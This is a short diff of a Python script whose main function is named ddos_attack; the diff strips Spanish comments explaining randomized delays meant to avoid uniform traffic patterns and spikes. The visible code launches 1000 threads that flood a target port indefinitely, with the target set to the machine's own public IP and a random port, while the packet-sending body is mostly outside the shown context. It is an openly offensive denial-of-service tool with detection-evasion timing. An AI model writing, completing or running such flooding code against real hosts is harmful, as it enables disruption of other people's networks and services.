@@ -22,16 +22,14 @@ def ddos_attack(target_ip, target_port, duration):
         except:
             pass
 
-        # Espera aleatoria entre 0.0001 y 0.001 segundos para evitar patrones uniformes
         time.sleep(random.uniform(0.0001, 0.001))
 
 if __name__ == "__main__":
     public_ip = get_public_ip()
     target_ip = public_ip
-    target_port = random.randint(1024, 65535)  # Puerto objetivo aleatorio
+    target_port = random.randint(1024, 65535) 
     duration_seconds = None
 
-    # Iniciar hilos con retraso aleatorio para evitar picos de tráfico
     threads = []
     for _ in range(1000):
         t = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration_seconds))
@@ -42,3 +40,4 @@ if __name__ == "__main__":
 
     for t in threads:
         t.join()
+
